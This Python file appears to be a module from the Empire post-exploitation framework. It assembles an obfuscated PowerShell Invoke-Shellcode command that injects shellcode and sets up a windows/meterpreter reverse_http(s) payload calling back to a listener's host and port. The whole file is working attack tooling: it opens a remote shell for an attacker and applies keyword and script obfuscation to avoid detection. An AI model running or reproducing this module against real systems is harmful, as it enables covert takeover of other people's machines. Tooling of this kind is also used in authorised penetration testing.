from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        script_end = "\nInvoke-Shellcode -Force"

        listener_name = params['Listener']
        if listener_name != "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""
            else:
                # TODO: redo pulling these listener configs...
                #Old method no longer working
                #temporary fix until a more elegant solution is in place, unless this is the most elegant???? :)
                #[ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = main_menu.listeners.get_listener(listener_name)
                host = main_menu.listeners.loadedListeners['meterpreter'].options['Host']
                port = main_menu.listeners.loadedListeners['meterpreter'].options['Port']

                MSFpayload = "reverse_http"
                if "https" in host:
                    MSFpayload += "s"

                hostname = host.split(":")[1].strip("/")
                params['Lhost'] = str(hostname)
                params['Lport'] = str(port)
                params['Payload'] = str(MSFpayload)

        for option,values in params.items():
            if option.lower() != "agent" and option.lower() != "listener":
                if values and values != '':
                    if option.lower() == "payload" :
                        payload = "windows/meterpreter/" + str(values)
                        script_end += " -" + str(option) + " " + payload
                    elif option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values.split("\\"))[0:]
                        script_end += " -" + str(option) + " @(" + sc + ")"
                    else: 
                        script_end += " -" + str(option) + " " + str(values)

        script_end += "; 'Shellcode injected.'"

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
